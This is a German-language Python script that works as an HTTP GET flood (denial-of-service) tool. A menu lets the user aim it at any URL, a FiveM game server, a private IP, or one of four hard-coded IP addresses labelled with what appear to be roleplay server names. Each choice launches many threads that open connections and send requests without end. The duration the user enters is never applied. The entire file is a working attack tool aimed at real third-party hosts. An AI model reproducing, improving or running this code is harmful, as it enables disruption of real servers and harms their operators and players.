import socket
import threading
import time
from urllib.parse import urlparse

def countdown(t):
    for i in range(t, 0, -1):
        print(i, end=" ", flush=True)
        time.sleep(1)
    print("Jetzt Wird RP gemacht!!!\n")

# Funktion zum Senden von HTTP GET-Anfragen
def attack(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n", (target_ip, target_port))
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except Exception as e:
            print(f"Fehler: {e}")

def main():
    print("Wähle das Angriffsziel:")
    print("1. URL")
    print("2. FiveM")
    print("3. Privat")
    print("4. California")
    print("5. Daylight")
    print("6. Nxsty")
    print("7. NewHistory")  
    choice = input("Deine Auswahl: ")

    if choice == '1':
        target_url = input("Gib die Ziel-URL ein: ")
        parsed_url = urlparse(target_url)
        target_ip = socket.gethostbyname(parsed_url.hostname)
        target_port = 80  # Standard-HTTP-Port
        duration = int(input("Gib die Dauer des Angriffs in Sekunden ein: "))
        threads = int(input("Gib die Anzahl der Threads ein: "))

        countdown(3)  # 3-Sekunden-Countdown
        for _ in range(threads):
            threading.Thread(target=attack, args=(target_ip, target_port)).start()

    elif choice == '2':
        target_ip = input("Gib die FiveM-IP ein: ")
        target_port = int(input("Gib den FiveM-Port ein: "))
        duration = int(input("Gib die Dauer des Angriffs in Sekunden ein: "))
        threads = int(input("Gib die Anzahl der Threads ein: "))

        countdown(3)  # 3-Sekunden-Countdown
        for _ in range(threads):
            threading.Thread(target=attack, args=(target_ip, target_port)).start()

    elif choice == '3':
        target_ip = input("Gib die private IP ein: ")
        target_port = int(input("Gib den privaten Port ein: "))
        duration = int(input("Gib die Dauer des Angriffs in Sekunden ein: "))
        threads = int(input("Gib die Anzahl der Threads ein: "))

        countdown(3)  # 3-Sekunden-Countdown
        for _ in range(threads):
            threading.Thread(target=attack, args=(target_ip, target_port)).start()

    elif choice == '4':
        target_ip = "80.75.212.165"
        target_port = int(input("Gib den Port ein: "))
        duration = int(input("Gib die Dauer des Angriffs in Sekunden ein: "))
        threads = int(input("Gib die Anzahl der Threads ein: "))

        countdown(3)  # 3-Sekunden-Countdown
        for _ in range(threads):
            threading.Thread(target=attack, args=(target_ip, target_port)).start()

    elif choice == '5':
        target_ip = "45.13.227.66"
        target_port = int(input("Gib den Port ein: "))
        duration = int(input("Gib die Dauer des Angriffs in Sekunden ein: "))
        threads = int(input("Gib die Anzahl der Threads ein: "))

        countdown(3)  # 3-Sekunden-Countdown
        for _ in range(threads):
            threading.Thread(target=attack, args=(target_ip, target_port)).start()

    elif choice == '6':
        target_ip = "5.175.192.68"
        target_port = int(input("Gib den Port ein: "))
        duration = int(input("Gib die Dauer des Angriffs in Sekunden ein: "))
        threads = int(input("Gib die Anzahl der Threads ein: "))

        countdown(3)  # 3-Sekunden-Countdown
        for _ in range(threads):
            threading.Thread(target=attack, args=(target_ip, target_port)).start()      

    elif choice == '7':
        target_ip = "5.253.246.155"
        target_port = int(input("Gib den Port ein: "))
        duration = int(input("Gib die Dauer des Angriffs in Sekunden ein: "))
        threads = int(input("Gib die Anzahl der Threads ein: "))

        countdown(3)  # 3-Sekunden-Countdown
        for _ in range(threads):
            threading.Thread(target=attack, args=(target_ip, target_port)).start()              

    else:
        print("Ungültige Auswahl. Beende das Programm.")

if __name__ == "__main__":
    main()